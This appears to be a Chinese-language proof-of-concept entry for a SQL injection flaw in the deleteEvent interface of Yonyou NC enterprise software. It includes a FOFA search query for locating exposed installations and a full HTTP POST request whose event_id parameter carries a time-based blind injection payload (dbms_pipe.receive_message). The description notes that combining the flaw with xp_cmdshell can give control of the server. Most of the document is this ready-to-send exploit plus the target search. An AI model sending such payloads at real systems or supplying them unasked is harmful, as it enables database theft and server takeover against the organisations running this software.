## 用友NC deleteEvent SQL注入漏洞

## 漏洞描述
用友 NC `deleteEvent` 接口对参数未做校验，攻击者可以构造恶意 SQL 语句执行数据库查询或命令，甚至配合 `xp_cmdshell` 获取服务器权限。

## 网络空间测绘
```
fofa: app="用友-UFIDA-NC"
```

## POC
```
POST /portal/pt/oacoSchedulerEvents/deleteEvent?pageId=login HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Connection: close

event_id=1' AND 1=dbms_pipe.receive_message('RDS',5) -- &startDate=2025-06-27 12:12:12&event_ts=2025-06-27 12:12:12
```
## 参考
- 社区情报

